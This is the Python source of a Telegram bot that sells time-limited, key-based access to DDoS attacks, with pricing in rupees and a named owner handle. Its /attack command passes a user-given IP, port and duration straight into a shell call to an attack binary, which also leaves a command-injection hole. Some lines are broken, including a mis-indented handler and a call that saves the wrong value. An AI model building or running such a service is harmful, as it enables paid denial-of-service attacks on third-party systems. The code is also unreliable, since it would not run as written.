import asyncio
import datetime
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'
ADMIN_USER_ID = 7129010361
USERS_FILE = 'users.txt'
KEYS_FILE = 'keys.txt'

def load_users():
    try:
        with open(USERS_FILE) as f:
            return {line.strip().split(",")[0]: line.strip().split(",")[1] for line in f}
    except FileNotFoundError:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user, expiry in users.items():
            f.write(f"{user},{expiry}\n")

def generate_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

def load_keys():
    try:
        with open(KEYS_FILE) as f:
            return {line.strip().split(",")[0]: line.strip().split(",")[1] for line in f}
    except FileNotFoundError:
        return {}

def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        for key, expiry in keys.items():
            f.write(f"{key},{expiry}\n")

users = load_users()
keys = load_keys()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "🚀 *WELCOME TO THE ULTIMATE ATTACK BOT!* 🚀\n\n"
        "🔥 *POWERED BY:* 彡[RAVI]彡\n"
        "💀 *OWNER:* @R_SDanger\n"
        "⚡ *FASTEST DDOS ATTACKS AVAILABLE!*\n\n"
        "🔹 *COMMANDS:*\n"
        "`/attack <IP> <PORT> <TIME>` - *Launch an attack!*\n"
        "`/genkey <days>` - *Generate a key (Admin only)*\n"
        "`/redeem <key>` - *Activate access!*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="❌ *YOU NEED A KEY!* USE `/redeem <key>`", parse_mode='Markdown')
        return

    if users[user_id] < datetime.datetime.now().strftime('%Y-%m-%d'):
        await context.bot.send_message(chat_id=chat_id, text="❌ *YOUR ACCESS HAS EXPIRED!*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="🛠 *USAGE:* `/attack <ip> <port> <time>`", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"💥 *ATTACK INITIATED!* 💥\n\n"
        f"🎯 *TARGET:* `{ip}`\n"
        f"🚀 *PORT:* `{port}`\n"
        f"⏳ *DURATION:* `{time} sec`\n\n"
        f"🔥 *OWNER:* @R_SDanger\n"
        f"⚡ *POWERED BY:* 彡[RAVI]彡"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

async def run_attack(chat_id, ip, port, time, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./pubg {ip} {port} {time} 100",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ *ERROR:* `{str(e)}`", parse_mode='Markdown')

    await context.bot.send_message(chat_id=chat_id, text="✅ *ATTACK COMPLETED!* ✅", parse_mode='Markdown')

async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="❌ *YOU ARE NOT AN ADMIN!*", parse_mode='Markdown')
        return

    if len(context.args) != 1 or not context.args[0].isdigit():
        await context.bot.send_message(chat_id=chat_id, text="🔑 *USAGE:* `/genkey <days>`", parse_mode='Markdown')
        return

    days = int(context.args[0])
    expiry_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime('%Y-%m-%d')
    key = generate_key()
    keys[key] = expiry_date
    save_keys(keys)

    await context.bot.send_message(chat_id=chat_id, text=f"✅ *KEY GENERATED:* `{key}`\n🔴 *VALID TILL:* `{expiry_date}`", parse_mode='Markdown')

async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="🔑 *USAGE:* `/redeem <key>`", parse_mode='Markdown')
        return

    key = context.args[0]
    if key not in keys:
        await context.bot.send_message(chat_id=chat_id, text="❌ *INVALID KEY!*", parse_mode='Markdown')
        return

    users[user_id] = keys[key]
    save_users(users)
    del keys[key]
    save_keys(key)

    await context.bot.send_message(chat_id=chat_id, text=f"✅ *ACCESS GRANTED!*\n🕐 *VALID TILL:* `{users[user_id]}`", parse_mode='Markdown')

async def buy(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "💰 *PRICING DETAILS* 💰\n\n"
        "🔹 *1 DAY ACCESS* - ₹100\n"
        "🔹 *7 DAYS ACCESS* - ₹500\n"
        "🔹 *30 DAYS ACCESS* - ₹1500\n\n"
        "⚡ *PAYMENT METHODS:*\n"
        "✅ UPI: `yourupi@paytm`\n"
        "✅ PAYTM: `yourpaytmnumber`\n\n"
        "📩 *TO BUY, CONTACT:* @R_SDanger"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
 application.add_handler(CommandHandler("buy", buy))
    application.run_polling()

if __name__ == '__main__':
    main()